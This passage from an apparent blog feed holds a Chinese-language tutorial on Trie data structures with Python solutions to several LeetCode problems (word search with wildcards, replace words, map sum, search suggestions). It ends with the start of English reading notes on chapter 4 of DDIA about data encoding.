class="literal">True</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="模板-3-带通配符的-Trie-支持’-’"><a href="#模板-3-带通配符的-Trie-支持’-’" class="headerlink" title="模板 3: 带通配符的 Trie (支持’.’)"></a>模板 3: 带通配符的 Trie (支持’.’)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">WordDictionary</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;支持&#x27;.&#x27;通配符的单词字典&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.root = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addWord</span>(<span class="params">self, word: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        node = <span class="variable language_">self</span>.root</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">            node = node.setdefault(char, &#123;&#125;)</span><br><span class="line">        node[<span class="string">&#x27;#&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self, word: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;支持&#x27;.&#x27;匹配任意单个字符&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._search_helper(word, <span class="number">0</span>, <span class="variable language_">self</span>.root)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_search_helper</span>(<span class="params">self, word: <span class="built_in">str</span>, index: <span class="built_in">int</span>, node: <span class="built_in">dict</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="comment"># 递归终止条件</span></span><br><span class="line">        <span class="keyword">if</span> index == <span class="built_in">len</span>(word):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">in</span> node</span><br><span class="line"></span><br><span class="line">        char = word[index]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">            <span class="comment"># &#x27;.&#x27;可以匹配任意字符</span></span><br><span class="line">            <span class="keyword">for</span> child <span class="keyword">in</span> node:</span><br><span class="line">                <span class="keyword">if</span> child != <span class="string">&#x27;#&#x27;</span> <span class="keyword">and</span> <span class="variable language_">self</span>._search_helper(word, index + <span class="number">1</span>, node[child]):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 普通字符</span></span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> node:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>._search_helper(word, index + <span class="number">1</span>, node[char])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line">wd = WordDictionary()</span><br><span class="line">wd.addWord(<span class="string">&quot;bad&quot;</span>)</span><br><span class="line">wd.addWord(<span class="string">&quot;dad&quot;</span>)</span><br><span class="line">wd.addWord(<span class="string">&quot;mad&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(wd.search(<span class="string">&quot;pad&quot;</span>))    <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(wd.search(<span class="string">&quot;bad&quot;</span>))    <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(wd.search(<span class="string">&quot;.ad&quot;</span>))    <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(wd.search(<span class="string">&quot;b..&quot;</span>))    <span class="comment"># True</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="LeetCode-经典题目与模板应用"><a href="#LeetCode-经典题目与模板应用" class="headerlink" title="LeetCode 经典题目与模板应用"></a>LeetCode 经典题目与模板应用</h2><h3 id="题目-1-208-Implement-Trie-Prefix-Tree"><a href="#题目-1-208-Implement-Trie-Prefix-Tree" class="headerlink" title="题目 1: [208] Implement Trie (Prefix Tree)"></a>题目 1: [208] Implement Trie (Prefix Tree)</h3><p><strong>难度</strong>: Medium</p>
<p><strong>题意</strong>: 实现 Trie 的基本操作</p>
<p><strong>解答</strong>: 使用标准模板即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Trie</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.root = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">self, word: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        node = <span class="variable language_">self</span>.root</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">            node = node.setdefault(char, &#123;&#125;)</span><br><span class="line">        node[<span class="string">&#x27;#&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self, word: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        node = <span class="variable language_">self</span>.root</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> node:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            node = node[char]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">in</span> node</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">startsWith</span>(<span class="params">self, prefix: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        node = <span class="variable language_">self</span>.root</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> prefix:</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> node:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            node = node[char]</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="题目-2-211-Design-Add-and-Search-Words-Data-Structure"><a href="#题目-2-211-Design-Add-and-Search-Words-Data-Structure" class="headerlink" title="题目 2: [211] Design Add and Search Words Data Structure"></a>题目 2: [211] Design Add and Search Words Data Structure</h3><p><strong>难度</strong>: Medium</p>
<p><strong>题意</strong>: 支持’.’通配符的单词搜索</p>
<p><strong>关键点</strong>:</p>
<ul>
<li>‘.’需要递归搜索所有可能的子节点</li>
<li>使用 DFS 遍历</li>
</ul>
<p><strong>解答</strong>: 使用模板 3</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">WordDictionary</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.root = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addWord</span>(<span class="params">self, word: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        node = <span class="variable language_">self</span>.root</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">            node = node.setdefault(char, &#123;&#125;)</span><br><span class="line">        node[<span class="string">&#x27;#&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self, word: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">index, node</span>):</span><br><span class="line">            <span class="keyword">if</span> index == <span class="built_in">len</span>(word):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">in</span> node</span><br><span class="line"></span><br><span class="line">            char = word[index]</span><br><span class="line">            <span class="keyword">if</span> char == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                <span class="comment"># 尝试所有子节点</span></span><br><span class="line">                <span class="keyword">for</span> child <span class="keyword">in</span> node:</span><br><span class="line">                    <span class="keyword">if</span> child != <span class="string">&#x27;#&#x27;</span> <span class="keyword">and</span> dfs(index + <span class="number">1</span>, node[child]):</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> node:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">return</span> dfs(index + <span class="number">1</span>, node[char])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dfs(<span class="number">0</span>, <span class="variable language_">self</span>.root)</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="题目-3-212-Word-Search-II"><a href="#题目-3-212-Word-Search-II" class="headerlink" title="题目 3: [212] Word Search II"></a>题目 3: [212] Word Search II</h3><p><strong>难度</strong>: Hard</p>
<p><strong>题意</strong>: 在二维字符网格中搜索多个单词</p>
<p><strong>关键点</strong>:</p>
<ul>
<li>将所有单词插入 Trie</li>
<li>使用 DFS + Trie 剪枝</li>
<li>找到单词后需要去重</li>
</ul>
<p><strong>完整解答</strong>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findWords</span>(<span class="params">self, board: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]], words: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="comment"># Step 1: 构建Trie树</span></span><br><span class="line">        trie = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">            node = trie</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">                node = node.setdefault(char, &#123;&#125;)</span><br><span class="line">            node[<span class="string">&#x27;#&#x27;</span>] = word  <span class="comment"># 存储完整单词</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 2: DFS搜索</span></span><br><span class="line">        rows, cols = <span class="built_in">len</span>(board), <span class="built_in">len</span>(board[<span class="number">0</span>])</span><br><span class="line">        result = []</span><br><span class="line">        visited = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">r, c, node, path</span>):</span><br><span class="line">            <span class="comment"># 边界检查</span></span><br><span class="line">            <span class="keyword">if</span> (r &lt; <span class="number">0</span> <span class="keyword">or</span> r &gt;= rows <span class="keyword">or</span> c &lt; <span class="number">0</span> <span class="keyword">or</span> c &gt;= cols <span class="keyword">or</span></span><br><span class="line">                (r, c) <span class="keyword">in</span> visited <span class="keyword">or</span> board[r][c] <span class="keyword">not</span> <span class="keyword">in</span> node):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">            char = board[r][c]</span><br><span class="line">            node = node[char]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 找到单词</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">in</span> node:</span><br><span class="line">                result.append(node[<span class="string">&#x27;#&#x27;</span>])</span><br><span class="line">                <span class="keyword">del</span> node[<span class="string">&#x27;#&#x27;</span>]  <span class="comment"># 避免重复添加</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 标记访问</span></span><br><span class="line">            visited.add((r, c))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 四个方向DFS</span></span><br><span class="line">            <span class="keyword">for</span> dr, dc <span class="keyword">in</span> [(<span class="number">0</span>,<span class="number">1</span>), (<span class="number">1</span>,<span class="number">0</span>), (<span class="number">0</span>,-<span class="number">1</span>), (-<span class="number">1</span>,<span class="number">0</span>)]:</span><br><span class="line">                dfs(r + dr, c + dc, node, path + char)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 回溯</span></span><br><span class="line">            visited.remove((r, c))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Step 3: 从每个位置开始搜索</span></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">                dfs(r, c, trie, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间复杂度: O(M * N * 4^L)</span></span><br><span class="line"><span class="comment"># M, N为网格大小，L为最长单词长度</span></span><br><span class="line"><span class="comment"># 空间复杂度: O(K * L)，K为单词数量</span></span><br></pre></td></tr></table></figure>

<p><strong>优化技巧</strong>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 优化1: 剪枝 - 如果某个节点下没有子节点了，删除它</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> node[char]:</span><br><span class="line">    <span class="keyword">del</span> node[char]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 优化2: 提前终止 - 如果找到所有单词就停止</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> trie:</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="题目-4-648-Replace-Words"><a href="#题目-4-648-Replace-Words" class="headerlink" title="题目 4: [648] Replace Words"></a>题目 4: [648] Replace Words</h3><p><strong>难度</strong>: Medium</p>
<p><strong>题意</strong>: 用字典中的词根替换句子中的单词</p>
<p><strong>示例</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: dictionary = [&quot;cat&quot;,&quot;bat&quot;,&quot;rat&quot;], sentence = &quot;the cattle was rattled by the battery&quot;</span><br><span class="line">Output: &quot;the cat was rat by the bat&quot;</span><br></pre></td></tr></table></figure>

<p><strong>解答</strong>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">replaceWords</span>(<span class="params">self, dictionary: <span class="type">List</span>[<span class="built_in">str</span>], sentence: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="comment"># 构建Trie</span></span><br><span class="line">        trie = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> dictionary:</span><br><span class="line">            node = trie</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">                node = node.setdefault(char, &#123;&#125;)</span><br><span class="line">            node[<span class="string">&#x27;#&#x27;</span>] = word  <span class="comment"># 存储词根</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 查找最短前缀</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">find_root</span>(<span class="params">word</span>):</span><br><span class="line">            node = trie</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">                <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> node:</span><br><span class="line">                    <span class="keyword">return</span> word  <span class="comment"># 没有找到词根</span></span><br><span class="line">                node = node[char]</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">in</span> node:</span><br><span class="line">                    <span class="keyword">return</span> node[<span class="string">&#x27;#&#x27;</span>]  <span class="comment"># 找到最短词根</span></span><br><span class="line">            <span class="keyword">return</span> word  <span class="comment"># 完整单词没有词根</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理句子</span></span><br><span class="line">        words = sentence.split()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join(find_root(word) <span class="keyword">for</span> word <span class="keyword">in</span> words)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间复杂度: O(N) - N为所有字符总数</span></span><br><span class="line"><span class="comment"># 空间复杂度: O(M) - M为字典中所有字符总数</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="题目-5-677-Map-Sum-Pairs"><a href="#题目-5-677-Map-Sum-Pairs" class="headerlink" title="题目 5: [677] Map Sum Pairs"></a>题目 5: [677] Map Sum Pairs</h3><p><strong>难度</strong>: Medium</p>
<p><strong>题意</strong>: 实现一个支持前缀和查询的数据结构</p>
<p><strong>关键点</strong>: 在 Trie 节点中存储数值</p>
<p><strong>解答</strong>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MapSum</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.root = &#123;&#125;</span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">map</span> = &#123;&#125;  <span class="comment"># 存储key-value对，用于更新</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">self, key: <span class="built_in">str</span>, val: <span class="built_in">int</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># 计算差值（如果key已存在）</span></span><br><span class="line">        delta = val - <span class="variable language_">self</span>.<span class="built_in">map</span>.get(key, <span class="number">0</span>)</span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">map</span>[key] = val</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 更新Trie中的值</span></span><br><span class="line">        node = <span class="variable language_">self</span>.root</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> key:</span><br><span class="line">            node = node.setdefault(char, &#123;&#125;)</span><br><span class="line">            node.setdefault(<span class="string">&#x27;val&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">            node[<span class="string">&#x27;val&#x27;</span>] += delta  <span class="comment"># 累加差值</span></span><br><span class="line">        node[<span class="string">&#x27;#&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sum</span>(<span class="params">self, prefix: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        node = <span class="variable language_">self</span>.root</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> prefix:</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> node:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            node = node[char]</span><br><span class="line">        <span class="keyword">return</span> node.get(<span class="string">&#x27;val&#x27;</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line">ms = MapSum()</span><br><span class="line">ms.insert(<span class="string">&quot;apple&quot;</span>, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(ms.<span class="built_in">sum</span>(<span class="string">&quot;ap&quot;</span>))      <span class="comment"># 3</span></span><br><span class="line">ms.insert(<span class="string">&quot;app&quot;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(ms.<span class="built_in">sum</span>(<span class="string">&quot;ap&quot;</span>))      <span class="comment"># 5</span></span><br><span class="line">ms.insert(<span class="string">&quot;apple&quot;</span>, <span class="number">5</span>)    <span class="comment"># 更新apple的值</span></span><br><span class="line"><span class="built_in">print</span>(ms.<span class="built_in">sum</span>(<span class="string">&quot;ap&quot;</span>))      <span class="comment"># 7</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="题目-6-720-Longest-Word-in-Dictionary"><a href="#题目-6-720-Longest-Word-in-Dictionary" class="headerlink" title="题目 6: [720] Longest Word in Dictionary"></a>题目 6: [720] Longest Word in Dictionary</h3><p><strong>难度</strong>: Medium</p>
<p><strong>题意</strong>: 找出字典中最长的可以逐个字母构建的单词</p>
<p><strong>示例</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: words = [&quot;w&quot;,&quot;wo&quot;,&quot;wor&quot;,&quot;worl&quot;,&quot;world&quot;]</span><br><span class="line">Output: &quot;world&quot;</span><br><span class="line">解释: &quot;world&quot;可以通过&quot;w&quot;-&gt;&quot;wo&quot;-&gt;&quot;wor&quot;-&gt;&quot;worl&quot;-&gt;&quot;world&quot;逐步构建</span><br></pre></td></tr></table></figure>

<p><strong>解答</strong>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestWord</span>(<span class="params">self, words: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="comment"># 构建Trie</span></span><br><span class="line">        trie = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">            node = trie</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">                node = node.setdefault(char, &#123;&#125;)</span><br><span class="line">            node[<span class="string">&#x27;#&#x27;</span>] = word</span><br><span class="line"></span><br><span class="line">        <span class="comment"># DFS查找最长单词</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">node, path</span>):</span><br><span class="line">            <span class="keyword">nonlocal</span> result</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 遍历所有子节点</span></span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> node:</span><br><span class="line">                <span class="keyword">if</span> char == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                child = node[char]</span><br><span class="line">                <span class="comment"># 必须是完整单词才能继续</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">in</span> child:</span><br><span class="line">                    new_path = child[<span class="string">&#x27;#&#x27;</span>]</span><br><span class="line">                    <span class="comment"># 更新结果（更长或字典序更小）</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(new_path) &gt; <span class="built_in">len</span>(result) <span class="keyword">or</span> \</span><br><span class="line">                       (<span class="built_in">len</span>(new_path) == <span class="built_in">len</span>(result) <span class="keyword">and</span> new_path &lt; result):</span><br><span class="line">                        result = new_path</span><br><span class="line">                    dfs(child, new_path)</span><br><span class="line"></span><br><span class="line">        dfs(trie, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间复杂度: O(N) - N为所有字符总数</span></span><br><span class="line"><span class="comment"># 空间复杂度: O(N)</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="题目-7-1268-Search-Suggestions-System"><a href="#题目-7-1268-Search-Suggestions-System" class="headerlink" title="题目 7: [1268] Search Suggestions System"></a>题目 7: [1268] Search Suggestions System</h3><p><strong>难度</strong>: Medium</p>
<p><strong>题意</strong>: 实现搜索建议系统，每输入一个字符返回最多 3 个建议</p>
<p><strong>示例</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: products = [&quot;mobile&quot;,&quot;mouse&quot;,&quot;moneypot&quot;,&quot;monitor&quot;,&quot;mousepad&quot;],</span><br><span class="line">       searchWord = &quot;mouse&quot;</span><br><span class="line">Output: [</span><br><span class="line">    [&quot;mobile&quot;,&quot;moneypot&quot;,&quot;monitor&quot;],</span><br><span class="line">    [&quot;mobile&quot;,&quot;moneypot&quot;,&quot;monitor&quot;],</span><br><span class="line">    [&quot;mouse&quot;,&quot;mousepad&quot;],</span><br><span class="line">    [&quot;mouse&quot;,&quot;mousepad&quot;],</span><br><span class="line">    [&quot;mouse&quot;,&quot;mousepad&quot;]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p><strong>解答</strong>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">suggestedProducts</span>(<span class="params">self, products: <span class="type">List</span>[<span class="built_in">str</span>], searchWord: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">        <span class="comment"># 方法1: Trie + DFS</span></span><br><span class="line">        <span class="comment"># 构建Trie</span></span><br><span class="line">        trie = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> product <span class="keyword">in</span> products:</span><br><span class="line">            node = trie</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> product:</span><br><span class="line">                node = node.setdefault(char, &#123;&#125;)</span><br><span class="line">            node[<span class="string">&#x27;#&#x27;</span>] = product</span><br><span class="line"></span><br><span class="line">        result = []</span><br><span class="line">        node = trie</span><br><span class="line">        prefix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 对每个前缀查找建议</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> searchWord:</span><br><span class="line">            prefix += char</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> node:</span><br><span class="line">                <span class="comment"># 没有匹配的产品</span></span><br><span class="line">                result.append([])</span><br><span class="line">                node = &#123;&#125;  <span class="comment"># 标记为空，后续都返回空列表</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                node = node[char]</span><br><span class="line">                <span class="comment"># DFS收集所有单词</span></span><br><span class="line">                suggestions = []</span><br><span class="line"></span><br><span class="line">                <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">n</span>):</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(suggestions) &gt;= <span class="number">3</span>:  <span class="comment"># 只需要3个</span></span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">in</span> n:</span><br><span class="line">                        suggestions.append(n[<span class="string">&#x27;#&#x27;</span>])</span><br><span class="line">                    <span class="comment"># 按字典序遍历</span></span><br><span class="line">                    <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">sorted</span>(n.keys()):</span><br><span class="line">                        <span class="keyword">if</span> key != <span class="string">&#x27;#&#x27;</span> <span class="keyword">and</span> <span class="built_in">len</span>(suggestions) &lt; <span class="number">3</span>:</span><br><span class="line">                            dfs(n[key])</span><br><span class="line"></span><br><span class="line">                dfs(node)</span><br><span class="line">                result.append(suggestions)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2: 排序 + 二分 (更简单)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">suggestedProducts</span>(<span class="params">self, products: <span class="type">List</span>[<span class="built_in">str</span>], searchWord: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">        products.sort()  <span class="comment"># 排序</span></span><br><span class="line">        result = []</span><br><span class="line">        prefix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> searchWord:</span><br><span class="line">            prefix += char</span><br><span class="line">            <span class="comment"># 找到第一个匹配的位置</span></span><br><span class="line">            i = bisect.bisect_left(products, prefix)</span><br><span class="line">            <span class="comment"># 取最多3个匹配的产品</span></span><br><span class="line">            suggestions = []</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">min</span>(i + <span class="number">3</span>, <span class="built_in">len</span>(products))):</span><br><span class="line">                <span class="keyword">if</span> products[j].startswith(prefix):</span><br><span class="line">                    suggestions.append(products[j])</span><br><span class="line">            result.append(suggestions)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># Trie方法时间: O(N*M + K*M*log26) N个产品，M平均长度，K为searchWord长度</span></span><br><span class="line"><span class="comment"># 排序方法时间: O(N*logN + K*N) 更简单实用</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Trie Tree</tag>
      </tags>
  </entry>
  <entry>
    <title>DDIA reading notes - chapter 4 Encoding &amp; Evolution</title>
    <url>/fundamental/storage/ddia-ch4-reading-notes/</url>
    <content><![CDATA[<p>This chapter focuses on the challenges of encoding and evolving data formats in distributed systems.</p>
<p>The chapter begins by discussing how data formats can impact system design and evolution. It then explores two common approaches to data encoding: binary encoding and text encoding. Binary encoding is more efficient but less human-readable, while text encoding is less efficient but more human-readable.</p>
<span id="more"></span>
